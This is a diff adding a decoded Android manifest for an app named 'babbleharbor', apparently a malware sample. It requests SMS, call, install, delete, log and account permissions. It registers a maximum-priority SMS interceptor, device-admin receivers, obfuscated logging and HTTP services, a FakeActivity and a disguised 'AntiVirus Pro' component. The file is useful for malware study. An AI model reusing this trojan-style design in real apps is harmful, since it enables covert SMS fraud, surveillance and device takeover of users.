@@ -1,0 +1,169 @@
+manifest
+- package: com.orangeery.babbleharbor
+- versionName: 30.0
+- versionCode: 30
+	uses-sdk
+	- minSdkVersion: 4
+	- targetSdkVersion: 4
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.DELETE_PACKAGES
+	uses-permission
+	- name: android.permission.MODIFY_PHONE_STATE
+	uses-permission
+	- name: android.permission.CALL_PHONE
+	uses-permission
+	- name: android.permission.CALL_PRIVILEGED
+	uses-permission
+	- name: android.permission.PROCESS_OUTGOING_CALLS
+	uses-permission
+	- name: android.permission.WRITE_CONTACTS
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: com.android.launcher.permission.INSTALL_SHORTCUT
+	uses-permission
+	- name: android.permission.ACCESS_COARSE_LOCATION
+	uses-permission
+	- name: android.permission.ACCESS_FINE_LOCATION
+	uses-permission
+	- name: android.permission.ACCESS_COARSE_UPDATES
+	uses-permission
+	- name: android.permission.READ_CALL_LOG
+	uses-permission
+	- name: android.permission.AUTHENTICATE_ACCOUNTS
+	uses-permission
+	- name: android.permission.GET_ACCOUNTS
+	uses-permission
+	- name: android.permission.GET_TASKS
+	uses-permission
+	- name: android.permission.ACCESS_NETWORK_STATE
+	uses-permission
+	- name: android.permission.INSTALL_PACKAGES
+	uses-permission
+	- name: android.permission.READ_LOGS
+	uses-permission
+	- name: android.permission.DELETE_PACKAGES
+	uses-permission
+	- name: android.permission.WAKE_LOCK
+	uses-permission
+	- name: com.google.android.c2dm.permission.RECEIVE
+	permission
+	- name: com.orangeery.babbleharbor.permission.C2D_MESSAGE
+	- protectionLevel: 2
+	uses-permission
+	- name: com.orangeery.babbleharbor.permission.C2D_MESSAGE
+	application
+	- icon: 2130837504
+	- name: com.orangeery.babbleharbor.MainApplication
+	- label: 2131165184
+		activity
+		- name: com.orangeery.babbleharbor.MainActivity
+		- configChanges: 160
+		- label: 2131165184
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		service
+		- exported: true
+		- name: com.orangeery.babbleharbor.USSDService
+		- enabled: true
+			intent-filter
+				action
+				- name: com.android.ussd.IExtendedNetworkService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.MainService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.LogService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.LongService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.LogcatService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.HttpService
+		service
+		- name: roijf.sdfqlkj.sfakjdfa.AdminService
+		receiver
+		- name: roijf.sdfqlkj.sfakjdfa.MainReceiver
+			intent-filter
+			- priority: 2147483647
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				action
+				- name: android.intent.action.USER_PRESENT
+			intent-filter
+				action
+				- name: android.intent.action.PACKAGE_REMOVED
+				action
+				- name: android.intent.action.PACKAGE_ADDED
+				data
+				- scheme: package
+		receiver
+		- name: roijf.sdfqlkj.sfakjdfa.GCMReceiver
+		- permission: com.google.android.c2dm.permission.SEND
+			intent-filter
+			- priority: 1000
+				action
+				- name: com.google.android.c2dm.intent.RECEIVE
+				category
+				- name: com.orangeery.babbleharbor
+		receiver
+		- name: roijf.sdfqlkj.sfakjdfa.AdminReceiver
+		- permission: android.permission.BIND_DEVICE_ADMIN
+		- label: 2131165184
+			meta-data
+			- name: android.app.device_admin
+			- resource: 2130968576
+			intent-filter
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
+				action
+				- name: android.app.action.DEVICE_ADMIN_DISABLED
+				action
+				- name: android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED
+		activity
+		- name: roijf.sdfqlkj.sfakjdfa.FakeActivity
+		activity
+		- name: roijf.sdfqlkj.sfakjdfa.WebActivity
+		- theme: 16973831
+		activity
+		- exported: true
+		- name: roijf.sdfqlkj.sfakjdfa.DialogActivity
+		- launchMode: 1
+		- theme: 16973835
+		- excludeFromRecents: true
+		- label: 
+		receiver
+		- name: antivirus.pro.MainReceiver
+			intent-filter
+				action
+				- name: android.intent.action.PACKAGE_REMOVED
+				action
+				- name: android.intent.action.PACKAGE_ADDED
+				data
+				- scheme: package
+			intent-filter
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+		activity
+		- name: antivirus.pro.MainActivity
+		- label: AntiVirus Pro
